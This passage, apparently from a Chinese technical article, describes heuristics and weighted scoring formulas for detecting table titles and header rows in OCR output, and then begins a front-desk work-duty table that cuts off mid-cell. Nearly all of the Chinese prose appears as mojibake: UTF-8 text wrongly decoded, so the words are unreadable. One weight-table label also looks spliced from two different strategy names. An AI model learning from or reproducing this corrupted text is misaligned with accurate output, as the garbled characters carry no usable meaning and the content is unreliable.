<h3 data-id="heading-3">å­—ä½“ç‰¹å¾åˆ¤æ–­</h3>
<p><strong>ç›®çš„</strong>ï¼šä»å­—å·ã€ä½ç½®å¯¹é½ç­‰è§†è§‰ç‰¹å¾åˆ¤æ–­æ–‡æœ¬æ˜¯å¦å¯èƒ½æ˜¯æ ‡é¢˜ã€‚</p>
<p>å¤§éƒ¨åˆ† OCR æœåŠ¡éƒ½ä¸ä¼šç›´æ¥æä¾›æ–‡å­—å­—å·ä¿¡æ¯ã€‚å› æ­¤ï¼Œéœ€è¦é€šè¿‡æ–‡æœ¬æ¡†åæ ‡ä¼°ç®—å­—å·ã€‚</p>
<p><strong>æ–¹æ³•</strong>ï¼š</p>
<p>OCR æ–‡æœ¬æ¡†åæ ‡ä¿¡æ¯ï¼ˆä»¥ TextIn ä¸ºä¾‹ï¼‰ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"position"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>x0<span class="hljs-punctuation">,</span> y0<span class="hljs-punctuation">,</span> x1<span class="hljs-punctuation">,</span> y1<span class="hljs-punctuation">,</span> x2<span class="hljs-punctuation">,</span> y2<span class="hljs-punctuation">,</span> x3<span class="hljs-punctuation">,</span> y3<span class="hljs-punctuation">]</span>
</code></pre>
<p>å­—å·ä¼°ç®—å…¬å¼ï¼ˆé«˜åº¦å·®è¿‘ä¼¼ä¼°ç®—ï¼‰ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">font_size</span> = (y3 - y0) / <span class="hljs-number">2</span>
</code></pre>
<p><strong>åˆ¤æ–­é€»è¾‘</strong>ï¼š</p>
<ul>
<li>å­—å·æ˜¾è‘—å¤§äºè¡¨æ ¼æ­£æ–‡å¹³å‡å­—å· â†’ æ ‡é¢˜æ¦‚ç‡é«˜ã€‚</li>
<li>å­—å·æ˜¾è‘—å°äºæ­£æ–‡ä½†å±…ä¸­ â†’ å¯èƒ½æ˜¯å‰¯æ ‡é¢˜ã€‚</li>
<li>è‹¥æ–‡æœ¬æ¡†åœ¨è¡¨æ ¼å·¦å³è¾¹ç•ŒèŒƒå›´å†…æ°´å¹³å±…ä¸­ â†’ æ ‡é¢˜æ¦‚ç‡ä¸Šå‡ã€‚</li>
</ul>
<p><strong>è¯„åˆ†ç¤ºä¾‹</strong>ï¼šå­—å·ä¸æ­£æ–‡å·®å¼‚è¶Šå¤§ã€ä½ç½®è¶Šå±…ä¸­ï¼Œå¾—åˆ†è¶Šé«˜ï¼ˆ0~1ï¼‰ã€‚</p>
<h3 data-id="heading-4">æ–‡æœ¬å†…å®¹ç‰¹å¾</h3>
<p><strong>ç›®çš„</strong>ï¼šä¾æ®å†…å®¹ç‰¹å¾åˆ¤æ–­æ–‡æœ¬æ˜¯å¦å…·å¤‡æ ‡é¢˜å…¸å‹è¡¨ç°ã€‚</p>
<p><strong>æ–¹æ³•</strong>ï¼š</p>
<ul>
<li>å»ºç«‹å¸¸ç”¨è¡¨æ ¼æ ‡é¢˜å…³é”®è¯è¡¨ï¼Œå¦‚ï¼š
"Table", "Tab.", "è¡¨", "Summary", "Overview", "Baseline", "Characteristics", "ç»Ÿè®¡", "æƒ…å†µ"</li>
<li>æ–‡æœ¬åŒ…å«å…³é”®è¯ â†’ é«˜åˆ†ã€‚</li>
<li>æ–‡æœ¬é•¿åº¦é€‚ä¸­ï¼ˆ&lt;= 25 å­—ç¬¦ï¼‰ä¸”æ— å¥å·ç»“å°¾ â†’ åŠ åˆ†ï¼ˆæ ‡é¢˜é€šå¸¸ä¸ºçŸ­è¯­è€Œéå¥å­ï¼‰ã€‚</li>
</ul>
<p><strong>è¯„åˆ†ç¤ºä¾‹</strong>ï¼šå…³é”®è¯åŒ¹é…è¶Šå¤šï¼Œç»“æ„ç‰¹å¾è¶Šç¬¦åˆï¼Œå¾—åˆ†è¶Šé«˜ï¼ˆ0~1ï¼‰ã€‚</p>
<h3 data-id="heading-5">æ–‡æœ¬è¯­ä¹‰ç›¸ä¼¼åº¦åˆ¤æ–­</h3>
<p><strong>ç›®çš„</strong>ï¼šé€šè¿‡è¯­ä¹‰å…³è”åˆ¤æ–­æ–‡æœ¬æ˜¯å¦ä¸è¡¨æ ¼å†…å®¹æ„æˆâ€œæ ‡é¢˜â€”æ•°æ®â€å…³ç³»ã€‚</p>
<p><strong>æ–¹æ³•</strong>ï¼š</p>
<ul>
<li>å°†æ–‡æœ¬ã€è¡¨æ ¼åˆ—åã€è¡Œæ•°æ®åˆ†åˆ«ç”Ÿæˆå‘é‡ï¼ˆembeddingï¼‰ã€‚</li>
<li>è®¡ç®—è¯­ä¹‰ç›¸ä¼¼åº¦ï¼š
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">similarity</span> = cos(embedding_text, embedding_table)
</code></pre>
</li>
<li>è‹¥æ–‡æœ¬ä¸è¡¨æ ¼ä¸»é¢˜ç›¸å…³ï¼Œæˆ–èƒ½æ¦‚æ‹¬è¡¨æ ¼å†…å®¹ â†’ é«˜é¢‘ç‡æ ‡é¢˜ç‰¹å¾ã€‚</li>
</ul>
<p><strong>è¯„åˆ†ç¤ºä¾‹</strong>ï¼šç›¸ä¼¼åº¦ â‰¥ 0.7 é€šå¸¸å¯è§†ä¸ºå¼ºç›¸å…³ã€‚</p>
<h3 data-id="heading-6">æ ¼å¼å’Œæ’ç‰ˆç‰¹å¾åˆ¤æ–­</h3>
<p><strong>ç›®çš„</strong>ï¼šåˆ©ç”¨æ’ç‰ˆè¿¹è±¡åˆ¤æ–­æ ‡é¢˜å¯èƒ½æ€§ã€‚</p>
<p><strong>æ–¹æ³•</strong>ï¼š</p>
<ul>
<li>æ–‡æœ¬æ˜¯å¦ç‹¬å å•è¡Œï¼ˆæ ‡é¢˜é€šå¸¸ä¸ä¸å…¶ä»–æ–‡æœ¬åŒè¡Œï¼‰ã€‚</li>
<li>æ˜¯å¦å«æœ‰æ ¼å¼æ€§ç¬¦å·ï¼šå†’å·ã€æ‹¬å·ã€%ã€$ ç­‰ â†’ å¯èƒ½æ˜¯åˆ†ç±»æè¿°æˆ–ç»Ÿè®¡æ ‡é¢˜ã€‚</li>
<li>æ–‡æœ¬æ¡†æ˜¯å¦åœ¨é¡µé¢æˆ–è¡¨æ ¼åŒºåŸŸå±…ä¸­ä½ç½®ã€‚</li>
</ul>
<p><strong>è¯„åˆ†ç¤ºä¾‹</strong>ï¼šç¬¦åˆæ ‡é¢˜å¸¸è§æ’ç‰ˆè¶Šå¤šï¼Œå¾—åˆ†è¶Šé«˜ã€‚</p>
<p>æœ€åé€šè¿‡ä»¥ä¸Šç­–ç•¥è¿›è¡Œå¤šç­–ç•¥åŠ æƒè¯„åˆ†ï¼Œç»¼åˆåˆ¤æ–­æ–‡æœ¬æ˜¯å¦ä¸ºæ ‡é¢˜ã€‚</p>
<h3 data-id="heading-7">åŠ æƒè¯„åˆ†ç®—æ³•</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">TitleScore</span> = w1*S_position + w2*S_font + w3*S_content + w4*S_semantic + w5*S_format
</code></pre>
<ul>
<li>S_iï¼šå„ç­–ç•¥å¾—åˆ†ï¼ˆ0~1ï¼‰</li>
<li>w_iï¼šå¯è°ƒæƒé‡</li>
</ul>
<p>æƒé‡ç¤ºä¾‹ï¼š</p>





























<table><thead><tr><th>ç­–ç•¥</th><th>æƒé‡</th></tr></thead><tbody><tr><td>ä½ç½®ç‰¹å¾</td><td>1.5</td></tr><tr><td>å­—ä½“ç‰¹å¾</td><td>1.5</td></tr><tr><td>æ–‡æœ¬å†…å®¹</td><td>2.0</td></tr><tr><td>è¯­ä¹‰ç›¸ä¼¼</td><td>1.0</td></tr><tr><td>æ ¼å¼æ’ç‰ˆ</td><td>0.8</td></tr></tbody></table>
<p>é˜ˆå€¼ç¤ºä¾‹ï¼š</p>
<ul>
<li>â‰¥ 2.5 â†’ åˆ¤å®šä¸ºæ ‡é¢˜</li>
<li>1.5 ~ 2.5 â†’ é«˜æ¦‚ç‡æ ‡é¢˜ï¼Œå»ºè®®äººå·¥ç¡®è®¤</li>
<li>&lt; 1.5 â†’ éæ ‡é¢˜</li>
</ul>
<h2 data-id="heading-8">è¯†åˆ«è¡¨æ ¼è¡¨å¤´</h2>
<p>è¡¨æ ¼è¡¨å¤´æ˜¯è¡¨æ ¼æ•°æ®ç»“æ„åŒ–å’Œè¯­ä¹‰ç†è§£çš„æ ¸å¿ƒè¦ç´ ã€‚å‡†ç¡®è¯†åˆ«è¡¨å¤´ä¸ä»…èƒ½æ˜ç¡®å„åˆ—æ•°æ®çš„å±æ€§ä¸å«ä¹‰ï¼ˆå¦‚â€œæ‚£è€…å¹´é¾„â€â€œè¯ç‰©å‰‚é‡â€â€œå®éªŒç»„åˆ«â€ï¼‰ï¼Œæ›´æ˜¯å®ç°è¡¨æ ¼æ•°æ®æ­£ç¡®è§£æã€è·¨è¡¨å¯¹é½ã€æ™ºèƒ½æŸ¥è¯¢åŠä¸‹æ¸¸åˆ†æå¤„ç†çš„åŸºç¡€å‰æã€‚</p>
<p>ç„¶è€Œï¼Œåœ¨å®é™…çš„OCRè¯†åˆ«åœºæ™¯ä¸­ï¼Œè¡¨å¤´è¯†åˆ«é¢ä¸´ç€æ˜¾è‘—æŒ‘æˆ˜ï¼šå¤šæ•°OCRæœåŠ¡ç¼ºä¹å¯¹è¡¨å¤´è¡Œçš„ç»“æ„åŒ–æ ‡æ³¨èƒ½åŠ›ï¼Œå¸¸å°†è¡¨å¤´ä¸æ•°æ®è¡Œæ··åŒå¤„ç†ï¼Œæˆ–ä»…ä¾èµ–è§†è§‰ç‰¹å¾è¿›è¡Œç®€å•åˆ¤æ–­ã€‚è¿™ç§è¯†åˆ«ä¸è¶³ç›´æ¥å¯¼è‡´äº†è¡¨æ ¼æ•°æ®çš„â€œè¯­ä¹‰ä¸¢å¤±â€â€”â€”å³ä¾¿å•å…ƒæ ¼å†…å®¹è¢«å‡†ç¡®æå–ï¼Œå…¶å­—æ®µå«ä¹‰ä¸æ•°æ®å…³ç³»ä¹Ÿæ— æ³•è¢«æ­£ç¡®ç†è§£ï¼Œä¸¥é‡åˆ¶çº¦äº†è¡¨æ ¼æ•°æ®çš„è‡ªåŠ¨åŒ–åˆ©ç”¨ä»·å€¼ã€‚</p>
<p>é€šè¿‡å¯¹è¡¨æ ¼å†…å®¹çš„æ·±åº¦ç‰¹å¾åˆ†æï¼Œåœ¨OCRåŸå§‹è¾“å‡ºåŸºç¡€ä¸Šå®ç°è¡¨å¤´è¡Œçš„æ™ºèƒ½è¯†åˆ«ä¸éªŒè¯ï¼Œæå‡è¡¨æ ¼æ•°æ®çš„ç»“æ„åŒ–è´¨é‡ä¸å¯ç”¨æ€§ã€‚</p>
<h3 data-id="heading-9">æ–‡æœ¬ä¸æ•°å€¼åˆ†å¸ƒåˆ†æ</h3>
<p><strong>ç›®çš„</strong>ï¼šåŒºåˆ†æè¿°æ€§è¡¨å¤´æ–‡æœ¬ä¸æ•°å€¼å‹æ•°æ®å†…å®¹ï¼ŒåŸºäºè¡¨æ ¼è¡Œé—´çš„å†…å®¹ç±»å‹å·®å¼‚åˆ¤æ–­é¦–è¡Œæ˜¯å¦ä¸ºè¡¨å¤´ã€‚</p>
<p><strong>æ–¹æ³•</strong>ï¼š</p>
<ul>
<li>éå†é¦–è¡Œæ‰€æœ‰å•å…ƒæ ¼ï¼Œç»Ÿè®¡éæ•°å­—æ–‡æœ¬å†…å®¹çš„æ¯”ä¾‹</li>
<li>éå†ç¬¬äºŒè¡Œæ‰€æœ‰å•å…ƒæ ¼ï¼Œç»Ÿè®¡çº¯æ•°å­—æˆ–å«æ•°å­—å†…å®¹çš„æ¯”ä¾‹</li>
<li>è®¡ç®—æ–‡æœ¬-æ•°å€¼åˆ†å¸ƒç‰¹å¾å¾—åˆ†</li>
</ul>
<p><strong>è¯„åˆ†ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>é¦–è¡Œæ–‡æœ¬æ¯”ä¾‹=85%ï¼Œæ¬¡è¡Œæ•°å€¼æ¯”ä¾‹=70% â†’ å¾—åˆ†ï¼š0.9ï¼ˆå¼ºè¡¨å¤´ä¿¡å·ï¼‰</li>
<li>é¦–è¡Œæ–‡æœ¬æ¯”ä¾‹=40%ï¼Œæ¬¡è¡Œæ•°å€¼æ¯”ä¾‹=30% â†’ å¾—åˆ†ï¼š0.3ï¼ˆå¼±è¡¨å¤´ä¿¡å·ï¼‰</li>
<li>é¦–è¡Œæ–‡æœ¬æ¯”ä¾‹=20%ï¼Œæ¬¡è¡Œæ•°å€¼æ¯”ä¾‹=80% â†’ å¾—åˆ†ï¼š0.1ï¼ˆå¯èƒ½ä¸ºæ•°æ®è¡Œï¼‰</li>
</ul>
<h3 data-id="heading-10">å•å…ƒæ ¼åˆå¹¶ç‰¹å¾æ£€æŸ¥</h3>
<p><strong>ç›®çš„</strong>ï¼šè¯†åˆ«è¡¨æ ¼ä¸­çš„åˆå¹¶å•å…ƒæ ¼ç‰¹å¾ï¼Œè¿™ç±»ç»“æ„ç‰¹å¾åœ¨è¡¨å¤´è¡Œä¸­å‡ºç°é¢‘ç‡æ˜¾è‘—é«˜äºæ•°æ®è¡Œã€‚</p>
<p><strong>æ–¹æ³•</strong>ï¼š</p>
<ul>
<li>è§£æHTMLè¡¨æ ¼ç»“æ„ï¼Œæ£€æµ‹é¦–è¡Œå•å…ƒæ ¼çš„rowspanå’Œcolspanå±æ€§</li>
<li>ç»Ÿè®¡å­˜åœ¨è·¨è¡Œ(rowspan&gt;1)æˆ–è·¨åˆ—(colspan&gt;1)çš„å•å…ƒæ ¼æ•°é‡</li>
<li>æ ¹æ®åˆå¹¶å•å…ƒæ ¼çš„æ¯”ä¾‹è®¡ç®—ç‰¹å¾å¾—åˆ†</li>
</ul>
<p><strong>è¯„åˆ†ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>é¦–è¡Œ5ä¸ªå•å…ƒæ ¼ä¸­æœ‰2ä¸ªcolspan=2 â†’ å¾—åˆ†ï¼š1.0</li>
<li>é¦–è¡Œå•å…ƒæ ¼å‡ä¸ºrowspan=1ä¸”colspan=1 â†’ å¾—åˆ†ï¼š0.0</li>
<li>é¦–è¡Œæœ‰1ä¸ªrowspan=3çš„åˆå¹¶å•å…ƒæ ¼ â†’ å¾—åˆ†ï¼š0.8</li>
</ul>
<h3 data-id="heading-11">æ•°å€¼å æ¯”å¯¹æ¯”åˆ†æ</h3>
<p><strong>ç›®çš„</strong>ï¼šé€šè¿‡é‡åŒ–åˆ†æé¦–è¡Œä¸æ¬¡è¡Œçš„æ•°å€¼å†…å®¹å æ¯”å·®å¼‚ï¼Œè¯†åˆ«è¡¨å¤´è¡Œé€šå¸¸åŒ…å«è¾ƒå°‘æ•°å€¼å†…å®¹çš„ç‰¹ç‚¹ã€‚</p>
<p><strong>æ–¹æ³•</strong>ï¼š</p>
<ul>
<li>åˆ†åˆ«è®¡ç®—é¦–è¡Œå’Œæ¬¡è¡Œå•å…ƒæ ¼å†…å®¹ä¸­çš„æ•°å­—å­—ç¬¦å æ¯”</li>
<li>åº”ç”¨å¯¹æ¯”é€»è¾‘ï¼šé¦–è¡Œæ•°å€¼å æ¯”ä½ä¸”æ¬¡è¡Œæ•°å€¼å æ¯”é«˜æ—¶å¾—åˆ†é«˜</li>
<li>ä½¿ç”¨é˜ˆå€¼åˆ¤æ–­ï¼ˆé¦–è¡Œ&lt;30%ï¼Œæ¬¡è¡Œ&gt;50%ï¼‰</li>
</ul>
<p><strong>è¯„åˆ†ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>é¦–è¡Œæ•°å€¼å æ¯”=15%ï¼Œæ¬¡è¡Œæ•°å€¼å æ¯”=65% â†’ å¾—åˆ†ï¼š1.0</li>
<li>é¦–è¡Œæ•°å€¼å æ¯”=40%ï¼Œæ¬¡è¡Œæ•°å€¼å æ¯”=55% â†’ å¾—åˆ†ï¼š0.4</li>
<li>é¦–è¡Œæ•°å€¼å æ¯”=10%ï¼Œæ¬¡è¡Œæ•°å€¼å æ¯”=20% â†’ å¾—åˆ†ï¼š0.2</li>
</ul>
<h3 data-id="heading-12">åˆ—åè¯­ä¹‰ç›¸ä¼¼æ€§è¯„ä¼°</h3>
<p><strong>ç›®çš„</strong>ï¼šè¯„ä¼°è¡¨å¤´è¡Œå„åˆ—ååœ¨é•¿åº¦ã€æ ¼å¼å’Œç”¨è¯ä¸Šçš„ä¸€è‡´æ€§ç‰¹å¾ï¼Œæ•°æ®è¡Œé€šå¸¸ç¼ºä¹è¿™ç§è§„å¾‹æ€§ã€‚</p>
<p><strong>æ–¹æ³•</strong>ï¼š</p>
<ul>
<li>è®¡ç®—é¦–è¡Œå„å•å…ƒæ ¼æ–‡æœ¬ä¹‹é—´çš„å­—ç¬¦çº§ç›¸ä¼¼åº¦ï¼ˆå¦‚ç¼–è¾‘è·ç¦»ã€Jaccardç›¸ä¼¼åº¦ï¼‰</li>
<li>å¯¹æ¯”é¦–è¡Œä¸æ¬¡è¡Œçš„å¹³å‡æ–‡æœ¬é•¿åº¦å·®å¼‚</li>
<li>ç»¼åˆç›¸ä¼¼åº¦å’Œé•¿åº¦ç‰¹å¾è®¡ç®—å¾—åˆ†</li>
<li/>
</ul>
<p><strong>è¯„åˆ†ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>é¦–è¡Œï¼š["å§“å","å¹´é¾„","æ€§åˆ«"]ï¼ˆé•¿åº¦å‡ä¸º2ï¼Œé«˜åº¦ç›¸ä¼¼ï¼‰â†’ å¾—åˆ†ï¼š0.9</li>
<li>é¦–è¡Œï¼š["å®éªŒæ—¥æœŸ","æ ·æœ¬ç¼–å·","pHå€¼"]ï¼ˆé•¿åº¦ä¸ä¸€ä½†æ ¼å¼è§„æ•´ï¼‰â†’ å¾—åˆ†ï¼š0.7</li>
<li>é¦–è¡Œï¼š["å¼ ä¸‰","25","ç”·"]ï¼ˆå†…å®¹æ— è§„å¾‹ï¼‰â†’ å¾—åˆ†ï¼š0.2</li>
</ul>
<h3 data-id="heading-13">å­—ç¬¦é•¿åº¦å¯¹æ¯”æ£€æµ‹</h3>
<p><strong>ç›®çš„</strong>ï¼šåˆ©ç”¨è¡¨å¤´é€šå¸¸æ¯”æ•°æ®è¡Œæ›´ç®€æ´çš„è§„å¾‹ï¼Œé€šè¿‡å­—ç¬¦é•¿åº¦å¯¹æ¯”è¯†åˆ«è¡¨å¤´è¡Œã€‚</p>
<p><strong>æ–¹æ³•</strong>ï¼š</p>
<ul>
<li>åˆ†åˆ«è®¡ç®—é¦–è¡Œå’Œæ¬¡è¡Œæ‰€æœ‰å•å…ƒæ ¼çš„å¹³å‡å­—ç¬¦é•¿åº¦</li>
<li>åº”ç”¨é•¿åº¦æ¯”ä¾‹é˜ˆå€¼ï¼šé¦–è¡Œå¹³å‡é•¿åº¦ &lt; æ¬¡è¡Œå¹³å‡é•¿åº¦ Ã— 0.7</li>
<li>æ ¹æ®æ¯”ä¾‹å·®å¼‚ç¨‹åº¦è®¡ç®—å¾—åˆ†</li>
</ul>
<p><strong>è¯„åˆ†ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>é¦–è¡Œå¹³å‡é•¿åº¦=4.2ï¼Œæ¬¡è¡Œå¹³å‡é•¿åº¦=12.5ï¼ˆæ¯”ä¾‹=0.34ï¼‰â†’ å¾—åˆ†ï¼š1.0</li>
<li>é¦–è¡Œå¹³å‡é•¿åº¦=8.1ï¼Œæ¬¡è¡Œå¹³å‡é•¿åº¦=10.3ï¼ˆæ¯”ä¾‹=0.79ï¼‰â†’ å¾—åˆ†ï¼š0.3</li>
<li>é¦–è¡Œå¹³å‡é•¿åº¦=15.6ï¼Œæ¬¡è¡Œå¹³å‡é•¿åº¦=9.8ï¼ˆæ¯”ä¾‹=1.59ï¼‰â†’ å¾—åˆ†ï¼š0.0</li>
</ul>
<h3 data-id="heading-14">ç‰¹æ®Šç¬¦å·æ¨¡å¼è¯†åˆ«</h3>
<p><strong>ç›®çš„</strong>ï¼šæ£€æµ‹è¡¨å¤´è¡Œç‰¹æœ‰çš„ç¬¦å·ä½¿ç”¨æ¨¡å¼ï¼Œå¦‚å•ä½ç¬¦å·ã€æ ¼å¼æ ‡æ³¨ç­‰ç‰¹æ®Šå­—ç¬¦ã€‚</p>
<p><strong>æ–¹æ³•</strong>ï¼š</p>
<ul>
<li>å®šä¹‰è¡¨å¤´å¸¸è§ç‰¹æ®Šç¬¦å·é›†ï¼š%, $, (), :, /, Â±, Â°ç­‰</li>
<li>æ‰«æé¦–è¡Œå•å…ƒæ ¼å†…å®¹ï¼Œè¯†åˆ«åŒ…å«ç‰¹æ®Šç¬¦å·çš„å•å…ƒæ ¼</li>
<li>æ ¹æ®åŒ…å«ç‰¹æ®Šç¬¦å·çš„å•å…ƒæ ¼æ¯”ä¾‹è®¡ç®—å¾—åˆ†</li>
</ul>
<p><strong>è¯„åˆ†ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>é¦–è¡Œï¼š["å‰‚é‡(mg)","ä»·æ ¼($)","æœ‰æ•ˆç‡(%)"] â†’ å¾—åˆ†ï¼š1.0</li>
<li>é¦–è¡Œï¼š["æ‚£è€…å¹´é¾„","æ²»ç–—æ–¹æ¡ˆ","éšè®¿æ—¥æœŸ"] â†’ å¾—åˆ†ï¼š0.0</li>
<li>é¦–è¡Œï¼š["æ¸©åº¦â„ƒ","pHå€¼","æµ“åº¦(mol/L)"] â†’ å¾—åˆ†ï¼š0.8</li>
</ul>
<h3 data-id="heading-15">é¢†åŸŸå…³é”®è¯åŒ¹é…</h3>
<p><strong>ç›®çš„</strong>ï¼šåˆ©ç”¨é¢†åŸŸçŸ¥è¯†è¯†åˆ«è¡¨å¤´å¸¸è§è¯æ±‡ï¼Œæé«˜åœ¨ä¸“ä¸šæ–‡æ¡£ä¸­çš„è¯†åˆ«å‡†ç¡®ç‡ã€‚</p>
<p><strong>æ–¹æ³•</strong>ï¼š</p>
<ul>
<li>å»ºç«‹è¡¨å¤´å…³é”®è¯åº“ï¼ˆå¯æ‰©å±•ï¼‰ï¼šå¹´ä»½ã€å®éªŒã€æ‚£è€…ã€è¯ç‰©ã€å‰‚é‡ã€æ€»æ•°ã€äººæ•°ã€æ€§åˆ«ã€å¹´é¾„ã€ç–¾ç—…ã€æœŸæ•°ã€ç»„åˆ«ç­‰</li>
<li>åŒ¹é…é¦–è¡Œå•å…ƒæ ¼å†…å®¹ä¸­çš„å…³é”®è¯</li>
<li>è®¡ç®—åŒ…å«å…³é”®è¯çš„å•å…ƒæ ¼æ¯”ä¾‹</li>
</ul>
<p><strong>è¯„åˆ†ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>é¦–è¡Œï¼š["å®éªŒç¼–å·","è¯ç‰©åç§°","å‰‚é‡(mg)","æ‚£è€…å¹´é¾„"] â†’ å¾—åˆ†ï¼š1.0</li>
<li>é¦–è¡Œï¼š["å¼ ä¸‰","é˜¿å¸åŒ¹æ—","25","45"] â†’ å¾—åˆ†ï¼š0.0</li>
<li>é¦–è¡Œï¼š["é‡‡é›†æ—¥æœŸ","æ ·æœ¬ç±»å‹","æ£€æµ‹ç»“æœ"] â†’ å¾—åˆ†ï¼š0.6</li>
</ul>
<p>æœ€åé€šè¿‡ä»¥ä¸Šç­–ç•¥è¿›è¡Œå¤šç­–ç•¥åŠ æƒè¯„åˆ†ï¼Œç»¼åˆåˆ¤æ–­è¡¨æ ¼è¡Œæ˜¯å¦ä¸ºè¡¨å¤´ã€‚</p>
<h3 data-id="heading-16">åŠ æƒè¯„åˆ†ç®—æ³•</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">HeaderScore</span> = w1*S_text_number + w2*S_merge + w3*S_number_ratio + w4*S_similarity + w5*S_length + w6*S_symbol + w7*S_keyword
</code></pre>
<ul>
<li>S_iï¼šå„ç­–ç•¥å¾—åˆ†ï¼ˆ0~1ï¼‰</li>
<li>w_iï¼šå¯è°ƒæƒé‡</li>
</ul>
<p>æƒé‡ç¤ºä¾‹ï¼š</p>





































<table><thead><tr><th>ç­–ç•¥</th><th>æƒé‡</th></tr></thead><tbody><tr><td>æ–‡æœ¬ä¸æ•°å€¼åˆ†å¸ƒåˆ†æ</td><td>2.0</td></tr><tr><td>å•å…ƒæ ¼åˆå¹¶ç‰¹å¾æ£€æŸ¥</td><td>1.5</td></tr><tr><td>æ•°å€¼å æ¯”å¯¹æ¯”åˆ†æ</td><td>1.5</td></tr><tr><td>åˆ—åè¯­ä¹‰ç›¸ä¼¼æ€§è¯„ä¼°</td><td>1.0</td></tr><tr><td>æ ¼å­—ç¬¦é•¿åº¦å¯¹æ¯”æ£€æµ‹å¼æ’ç‰ˆ</td><td>0.8</td></tr><tr><td>ç‰¹æ®Šç¬¦å·æ¨¡å¼è¯†åˆ«</td><td>0.8</td></tr><tr><td>é¢†åŸŸå…³é”®è¯åŒ¹é…</td><td>1.5</td></tr></tbody></table>
<p>é˜ˆå€¼ç¤ºä¾‹ï¼š</p>
<ul>
<li>â‰¥ 3.0ï¼šæ˜ç¡®ä¸ºè¡¨å¤´è¡Œ</li>
<li>2.0 ~ 3.0 â†’ é«˜æ¦‚ç‡è¡¨å¤´ï¼Œè‡ªåŠ¨æ ‡è®°ï¼ŒæŠ½æ ·å¤æ ¸</li>
<li>1.0 ~ 2.0 â†’ ä½æ¦‚ç‡è¡¨å¤´ï¼Œå»ºè®®äººå·¥å¤æ ¸</li>
<li>&lt; 1.0ï¼šéè¡¨å¤´è¡Œ</li>
</ul>
<h2 data-id="heading-17">è¡¨æ ¼å†…å®¹ç»“æ„åŒ–å¤„ç†</h2>
<h3 data-id="heading-18">å®Œæ•´ç»“æ„è¡¨æ ¼ï¼ˆæœ‰æ ‡é¢˜ + æœ‰è¡¨å¤´ï¼‰</h3>
<p><strong>å¤„ç†æµç¨‹</strong>ï¼š</p>
<ul>
<li>åˆ—æ‹¼æ¥ï¼šå°†è¡¨æ ¼æ ‡é¢˜ä¸å„åˆ—è¡¨å¤´è¿›è¡Œç»„åˆï¼Œå½¢æˆ"å­—æ®µå: å†…å®¹"çš„æ ‡å‡†æ ¼å¼</li>
<li>ç±»å‹è¯†åˆ«ï¼šæ ¹æ®åˆ—å†…å®¹ç‰¹å¾è‡ªåŠ¨è¯†åˆ«åˆ—ç±»å‹ï¼Œé€‚é…ä¸åŒå¤„ç†ç­–ç•¥</li>
<li>å†…å®¹ä¼˜åŒ–ï¼šå¯¹é•¿æ–‡æœ¬åˆ—è¿›è¡Œæ™ºèƒ½åˆ‡åˆ†ï¼Œå¹³è¡¡è¯­ä¹‰å®Œæ•´æ€§ä¸æ£€ç´¢å‹å¥½æ€§</li>
</ul>
<p>ä»¥ä¸‹è¡¨æ ¼æ ‡é¢˜ä¸ºã€Šå·¥ä½œå†…å®¹ã€‹è¡¨æ ¼ä¸ºä¾‹ï¼š</p>



















<table><thead><tr><th>å·¥ä½œæ¨¡å—</th><th>ç±»å‹</th><th>å†…å®¹</th><th>æ ‡å‡†</th><th>æµç¨‹</th></tr></thead><tbody><tr><td>ååŠ©æ¥¼é•¿å·¥ä½œ</td><td>å‰å°æ¥å¾…&amp;å’¨è¯¢è§£ç­”</td><td>å‰å°æ¥å¾…</td><td>1ã€ç€è£…å¹²å‡€æ•´æ´ã€æ·¡å¦†è¯­ \n 2ã€è°ˆåç«¯åº„ï¼Œç¤¼è²Œç”¨è¯­</td><td>æ¥è®¿æ¥å¾…ï¼š\n 1ã€å®¢æˆ·æ¥è®¿ï¼Œç™»è®°æ¥è®¿ä¿¡æ¯ï¼ˆå¾®ä¿¡äºŒç»´ç ï¼‰ï¼Œæ´¾å‘â€œè®¿å®¢è´´â€ç»™å¯¹æ–¹åæŒ‡å¼•åœ¨å‰å…ç­‰å€™ï¼Œè®¿å®¢è‡ªè¡Œ \n é€šçŸ¥ç›¸å…³åŒäº‹å‡ºæ¥æ¥å¾…ï¼›\n 2ã€æ¥å¾…é¢è¯•äººå‘˜ï¼Œç™»è®°æ¥è®¿ä¿¡æ¯ï¼ˆå¾®ä¿¡äºŒç»´ç &amp;çº¸è´¨ç‰ˆï¼‰ï¼Œæ£€æŸ¥é€šçŸ¥é¢è¯•ä¿¡æ¯ï¼Œæ£€æŸ¥æ— è¯¯ååœ¨å¾®ä¿¡ \n â€œé¢è¯•æ¥å¾…å°åˆ†ç»„â€å‘å‡ºæ¥¼å±‚+å§“åï¼Œé€šçŸ¥HRå‡ºæ¥æ¥å¾…ï¼›\n 3ã€é‡åˆ°æ¨é”€äººå‘˜ï¼šè‹¥æœ‰å…¶ä»–å…¬å¸çš„æ¨é”€äººå‘˜ä¸Šé—¨æ¨é”€ï¼Œåº”ç«‹åˆ»é€šçŸ¥ç‰©ä¸šå…¬å¸å¤„ç†ï¼Œè‹¥æœ‰å‘˜å·¥éœ€è¦ä»– \n ä»¬çš„æœåŠ¡ï¼Œå‘ŠçŸ¥ç›¸å…³éƒ¨é—¨å‘˜å·¥ç›´æ¥ä¸å…¶å¯¹æ¥ï¼›\n 4ã€é‡åˆ°å¹¿å·åˆ†å…¬å¸æˆ–ç¾å‘åŸ¹è®­ä¸­å¿ƒçš„åŸ¹è®­äººå‘˜ï¼Œå¯æŒ‡å¼•åˆ°ç›¸åº”ä½ç½®å‚åŠ åŸ¹è®­ã€‚\n ç”µè¯æ¥å¾…ï¼š\n 